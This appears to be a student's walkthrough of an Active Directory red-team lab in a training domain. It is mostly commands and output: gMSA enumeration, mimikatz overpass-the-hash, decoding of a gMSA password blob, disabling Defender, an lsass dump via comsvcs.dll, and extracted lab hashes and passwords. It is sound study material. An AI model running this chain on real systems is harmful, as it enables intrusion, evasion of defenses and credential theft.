# HANDS-ON 10:

```
- Enumerate gMSAs in the us.techcorp.local domain.
- Enumerate the principals that can read passwords from any gMSAs.
- Compromise one such principal and retrieve the password from a gMSA.
- Find if the gMSA has high privileges on any machine and extract credentials from that machine.

```

## Index of content

  1. [Enumerate gMSAs]
  2. [Enumerate principals]
  3. [Compromise principal]
  4. [Use gMSA]


## Enumerate gMSAs
```
PS C:\AD\Tools\InviShell> Get-ADServiceAccount -FIlter *


DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :
```
```
PS C:\AD\Tools\InviShell> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=provisioning svc,CN=Users,DC=us,DC=techcorp,DC=local}

```

## Enumerate principals
```
PS C:\AD\Tools\InviShell> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::opassth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe
user    : provisioningsvc
domain  : us.techcorp.local
program : cmd.exe
impers. : no
AES256  : a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a
  |  PID  6072
  |  TID  6064
  |  LSA Process is now R/W
  |  LUID 0 ; 14045749 (00000000:00d65235)
  \_ msv1_0   - data copy @ 00000160D153E810 : OK !
  \_ kerberos - data copy @ 00000160D1CC5EB8
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 00000160D1CCDE18 (32) -> null

mimikatz #

```
```
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
us\studentuser34 S-1-5-21-210670787-2521448726-163245708-16104

ERROR: Unable to get group membership information.

C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

```
```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```
```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```
Extract Blob password:
```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
## Compromise principals

Extract NTLM of user:
```
Import module:
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob

PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
6d16fa06998c60abce35d117f650b501
```

Impersonate Shell:

```
PS C:\Windows\system32> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:6d16fa06998c60abce35d117f650b501 /run:cmd.exe"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:6d16fa06998c60abce35d117f650b501 /run:cmd.exe
user    : jumpone
domain  : us.techcorp.local
program : cmd.exe
impers. : no
NTLM    : 6d16fa06998c60abce35d117f650b501
  |  PID  1356
  |  TID  4436
  |  LSA Process is now R/W
  |  LUID 0 ; 14709661 (00000000:00e0739d)
  \_ msv1_0   - data copy @ 00000160D15822D0 : OK !
  \_ kerberos - data copy @ 00000160D1CC53C8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000160D2087B58 (32) -> null
   
   
   
   
   Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Use gMSA

```
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
us\studentuser34 S-1-5-21-210670787-2521448726-163245708-16104

ERROR: Unable to get group membership information.

```

Access to jump machine:
```
C:\Windows\system32>winrs -r:us-jump cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jumpone$>whoami
whoami
us\jumpone$

C:\Users\jumpone$>hostname
hostname
US-Jump

C:\Users\jumpone$>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::11da:c810:b0c2:ece2%3
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254
```


## Dump credentials:

Disable realtime monitoring on the target machine:
```
PS C:\Users\Public> Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
```
Dump lsass process with PID 708:
```
PS C:\Users\Public> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
```
Copy dump file to virtual machine:

```
C:\Windows\system32>echo F | xcopy d:\lsass.dmp C:\Users\Public\lsass.dmp
Does C:\Users\Public\lsass.dmp specify a file name
or directory name on the target
(F = file, D = directory)? F
D:\lsass.dmp
1 File(s) copied

C:\Windows\system32>dir C:\Users\Public
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B
```

Extract Minudump on the student user virtual machine :

```
C:\AD\Tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump
Switch to MINIDUMP : ERROR kuhl_m_sekurlsa_minidump ; <minidumpfile.dmp> argument is missing

mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.dmp
Switch to MINIDUMP : 'C:\AD\Tools\lsass.dmp'

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::keys
Opening : 'C:\AD\Tools\lsass.dmp' file for minidump...

Authentication Id : 0 ; 27618598 (00000000:01a56d26)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:08:20 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1138

         * Username : pawadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30
           rc4_hmac_nt       36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old      36ea28bfa97a992b5e85bd22485e8d52
           rc4_md4           36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_nt_exp   36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old_exp  36ea28bfa97a992b5e85bd22485e8d52

Authentication Id : 0 ; 41691 (00000000:0000a2db)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:52 AM
SID               : S-1-5-90-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 41671 (00000000:0000a2c7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:52 AM
SID               : S-1-5-90-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 24004 (00000000:00005dc4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:52 AM
SID               : S-1-5-96-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 23952 (00000000:00005d90)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:52 AM
SID               : S-1-5-96-0-0

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 26781128 (00000000:0198a5c8)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:52 AM
SID               : S-1-5-90-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 26775856 (00000000:01989130)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:52 AM
SID               : S-1-5-96-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-JUMP$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:51 AM
SID               : S-1-5-18

         * Username : us-jump$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       88f63b9e6109aeab1c3d706a8345088659b9784614469099b65bac8fe011b277
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 28116786 (00000000:01ad0732)
Session           : Service from 0
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:09:20 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140

         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
           rc4_md4           23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f

Authentication Id : 0 ; 27618568 (00000000:01a56d08)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:08:20 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1138

         * Username : pawadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30
           rc4_hmac_nt       36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old      36ea28bfa97a992b5e85bd22485e8d52
           rc4_md4           36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_nt_exp   36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old_exp  36ea28bfa97a992b5e85bd22485e8d52

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-JUMP$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:52 AM
SID               : S-1-5-20

         * Username : us-jump$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       88f63b9e6109aeab1c3d706a8345088659b9784614469099b65bac8fe011b277
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 26781098 (00000000:0198a5aa)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:52 AM
SID               : S-1-5-90-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 165871 (00000000:000287ef)
Session           : Service from 0
User Name         : appsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 2:39:07 AM
SID               : S-1-5-21-210670787-2521448726-163245708-4601

         * Username : appsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : Us$rT0AccessDBwithImpersonation
         * Key List :
           aes256_hmac       b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335
           aes128_hmac       14284e4b83fdf58132aa2da8c1b49592
           rc4_hmac_nt       1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old      1d49d390ac01d568f0ee9be82bb74d4c
           rc4_md4           1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_nt_exp   1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old_exp  1d49d390ac01d568f0ee9be82bb74d4c
```
